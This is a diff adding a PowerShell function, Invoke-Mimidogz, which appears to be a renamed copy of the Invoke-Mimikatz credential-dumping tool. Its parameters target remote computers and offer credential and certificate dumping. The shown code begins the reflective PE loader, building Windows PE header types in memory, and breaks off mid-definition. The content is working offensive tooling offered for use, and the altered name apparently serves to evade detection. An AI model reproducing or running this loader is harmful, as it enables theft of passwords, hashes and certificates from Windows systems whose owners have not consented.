@@ -1,0 +1,125 @@
+function Invoke-Mimidogz
+{
+
+
+[CmdletBinding(DefaultParameterSetName="DumpCred")]
+Param(
+	[Parameter(Position = 0)]
+	[String[]]
+	$ComputerName,
+
+    [Parameter(ParameterSetName = "DumpCred", Position = 1)]
+    [Switch]
+    $DumpCred,
+
+    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
+    [Switch]
+    $DumpCerts,
+
+    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
+    [String]
+    $Command
+)
+
+Set-StrictMode -Version 2
+
+
+$RemoteScriptBlock = {
+	[CmdletBinding()]
+	Param(
+		[Parameter(Position = 0, Mandatory = $true)]
+		[String]
+		$PEBytes64,
+
+        [Parameter(Position = 1, Mandatory = $true)]
+		[String]
+		$PEBytes32,
+		
+		[Parameter(Position = 2, Mandatory = $false)]
+		[String]
+		$FuncReturnType,
+				
+		[Parameter(Position = 3, Mandatory = $false)]
+		[Int32]
+		$ProcId,
+		
+		[Parameter(Position = 4, Mandatory = $false)]
+		[String]
+		$ProcName,
+
+        [Parameter(Position = 5, Mandatory = $false)]
+        [String]
+        $ExeArgs
+	)
+	
+
+
+
+	Function Get-Win32Types
+	{
+		$Win32Types = New-Object System.Object
+
+
+
+		$Domain = [AppDomain]::CurrentDomain
+		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
+		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
+		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
+
+
+
+
+		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
+		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
+		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
+		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
+		$MachineType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType
+
+
+		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
+		$MagicType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType
+
+
+		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
+		$SubSystemType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType
+
+
+		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
+		$DllCharacteristicsType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType
+
+
+
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY
